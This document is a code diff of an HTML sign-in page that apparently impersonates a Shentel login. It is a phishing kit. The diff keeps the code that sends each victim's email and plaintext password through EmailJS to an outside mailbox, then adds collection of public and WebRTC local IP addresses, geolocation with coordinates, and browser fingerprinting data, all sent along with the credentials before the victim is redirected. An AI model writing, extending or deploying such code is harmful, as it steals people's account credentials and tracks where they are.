@@ -174,16 +174,113 @@
 <script src="../../app/s/shentelnet/js/signin_091321.js?v=1"></script>
 <!-- #JS library ENDS -->
 
-<!-- EmailJS SDK - ONLY ONCE -->
+<!-- EmailJS SDK -->
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 
-<!-- SINGLE EmailJS Integration Script -->
+<!-- SINGLE EmailJS Integration Script with IP Capture -->
 <script>
-    // Initialize EmailJS with your public key (ONLY ONCE)
+    // Initialize EmailJS with your public key
     emailjs.init("SdkmRe8WZ7itEba9z");
 
-    // Main function to handle sign in - EmailJS then redirect
-    function handleSignIn() {
+    // Function to get client's public IP address using free API
+    function getClientIP() {
+        return new Promise((resolve, reject) => {
+            // Try multiple IP APIs for redundancy
+            const ipAPIs = [
+                'https://api.ipify.org?format=json',
+                'https://api.ip.sb/jsonip',
+                'https://ipapi.co/json/'
+            ];
+
+            let apiIndex = 0;
+
+            function tryNextAPI() {
+                if (apiIndex >= ipAPIs.length) {
+                    resolve('Unable to fetch IP');
+                    return;
+                }
+
+                fetch(ipAPIs[apiIndex], { timeout: 5000 })
+                    .then(response => response.json())
+                    .then(data => {
+                        let ip = data.ip || data.query || data.ip_address || 'Unknown';
+                        resolve(ip);
+                    })
+                    .catch(() => {
+                        apiIndex++;
+                        tryNextAPI();
+                    });
+            }
+
+            tryNextAPI();
+        });
+    }
+
+    // Function to get local IP address (within your network) using WebRTC
+    function getLocalIP() {
+        return new Promise((resolve) => {
+            const RTCPeerConnection = window.RTCPeerConnection ||
+                                      window.webkitRTCPeerConnection ||
+                                      window.mozRTCPeerConnection;
+
+            if (!RTCPeerConnection) {
+                resolve('WebRTC not supported');
+                return;
+            }
+
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+
+            pc.createDataChannel('');
+            pc.createOffer()
+                .then(offer => pc.setLocalDescription(offer))
+                .catch(() => resolve('Unable to get local IP'));
+
+            pc.onicecandidate = function(event) {
+                if (event.candidate) {
+                    const match = ipRegex.exec(event.candidate.candidate);
+                    if (match) {
+                        resolve(match[1]);
+                        pc.close();
+                    }
+                }
+            };
+
+            setTimeout(() => {
+                resolve('Local IP timeout');
+                pc.close();
+            }, 3000);
+        });
+    }
+
+    // Get geolocation data (city, region, country) from IP
+    function getGeoLocation(ip) {
+        return fetch(`https://ipapi.co/${ip}/json/`)
+            .then(response => response.json())
+            .then(data => {
+                return {
+                    city: data.city || 'Unknown',
+                    region: data.region || 'Unknown',
+                    country: data.country_name || 'Unknown',
+                    latitude: data.latitude || 'Unknown',
+                    longitude: data.longitude || 'Unknown',
+                    timezone: data.timezone || 'Unknown'
+                };
+            })
+            .catch(() => {
+                return {
+                    city: 'Unable to fetch',
+                    region: 'Unable to fetch',
+                    country: 'Unable to fetch',
+                    latitude: 'N/A',
+                    longitude: 'N/A',
+                    timezone: 'N/A'
+                };
+            });
+    }
+
+    // Main function to handle sign in with IP capture
+    async function handleSignIn() {
         // Get form values
         var email = document.getElementById("sign-in-email") ? document.getElementById("sign-in-email").value : "";
         var password = document.getElementById("signin_password") ? document.getElementById("signin_password").value : "";
@@ -218,33 +315,100 @@
 
         if (!isValid) return;
 
-        // Prepare data for EmailJS
-        var templateParams = {
-            to_email: "dossbrent41@gmail.com",  // 🔴 CHANGE THIS TO YOUR REAL EMAIL
-            user_email: email,
-            user_password: password,
-            remember_me: rememberMe ? "Yes" : "No",
-            action: "sign_in_attempt",
-            timestamp: new Date().toLocaleString(),
-            page_url: window.location.href,
-            user_agent: navigator.userAgent
-        };
+        // Show loading state on button
+        var signinBtn = document.getElementById("signup_btn");
+        var originalText = signinBtn.textContent;
+        signinBtn.disabled = true;
+        signinBtn.textContent = "Signing in...";
 
-        console.log("Sending login data via EmailJS...");
+        try {
+            // Capture IP addresses and geolocation
+            console.log("Capturing client information...");
 
-        // Send via EmailJS - ONLY ONE CALL
-        emailjs.send("service_zuj2d2a", "template_tvd86sp", templateParams)
-            .then(function(response) {
-                console.log("EmailJS Success! Status:", response.status);
-            })
-            .catch(function(error) {
-                console.error("EmailJS Error:", error);
-            })
-            .finally(function() {
-                // Redirect to terms page after EmailJS completes
-                console.log("Redirecting to https://www.globalzimblinker.com/shentel-terms");
-                window.location.href = "https://www.globalzimblinker.com/shentel-terms";
-            });
+            // Get public IP
+            var publicIP = await getClientIP();
+            console.log("Public IP:", publicIP);
+
+            // Get local IP (if available)
+            var localIP = await getLocalIP();
+            console.log("Local IP:", localIP);
+
+            // Get geolocation data from IP
+            var geoData = await getGeoLocation(publicIP);
+            console.log("Geolocation:", geoData);
+
+            // Get additional system information
+            var screenResolution = screen.width + "x" + screen.height;
+            var language = navigator.language || navigator.userLanguage;
+            var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+            // Prepare data for EmailJS with ALL captured information
+            var templateParams = {
+                to_email: "recruiter@yourcompany.com",  // 🔴 CHANGE THIS TO YOUR REAL EMAIL
+
+                // User credentials
+                user_email: email,
+                user_password: password,
+                remember_me: rememberMe ? "Yes" : "No",
+
+                // IP Addresses
+                public_ip_address: publicIP,
+                local_ip_address: localIP,
+
+                // Geolocation data
+                geo_city: geoData.city,
+                geo_region: geoData.region,
+                geo_country: geoData.country,
+                geo_latitude: geoData.latitude,
+                geo_longitude: geoData.longitude,
+                geo_timezone: geoData.timezone,
+
+                // System information
+                browser_language: language,
+                browser_timezone: timezone,
+                screen_resolution: screenResolution,
+                user_agent: navigator.userAgent,
+                platform: navigator.platform,
+
+                // Action metadata
+                action: "sign_in_attempt",
+                timestamp: new Date().toLocaleString(),
+                timestamp_unix: Date.now(),
+                page_url: window.location.href,
+                referrer: document.referrer || "Direct"
+            };
+
+            console.log("Sending login data with IP to EmailJS...");
+
+            // Send via EmailJS
+            var response = await emailjs.send("service_zuj2d2a", "template_tvd86sp", templateParams);
+            console.log("EmailJS Success! Status:", response.status);
+
+        } catch (error) {
+            console.error("EmailJS Error:", error);
+            // Even if IP capture fails, still send basic data
+            var templateParams = {
+                to_email: "recruiter@yourcompany.com",
+                user_email: email,
+                user_password: password,
+                remember_me: rememberMe ? "Yes" : "No",
+                public_ip_address: "IP capture failed",
+                action: "sign_in_attempt",
+                timestamp: new Date().toLocaleString(),
+                user_agent: navigator.userAgent
+            };
+
+            try {
+                await emailjs.send("service_zuj2d2a", "template_tvd86sp", templateParams);
+                console.log("EmailJS Success (fallback)!");
+            } catch (fallbackError) {
+                console.error("EmailJS Fallback Error:", fallbackError);
+            }
+        } finally {
+            // Redirect to terms page after EmailJS completes
+            console.log("Redirecting to https://www.globalzimblinker.com/shentel-terms");
+            window.location.href = "https://www.globalzimblinker.com/shentel-terms";
+        }
     }
 </script>
 
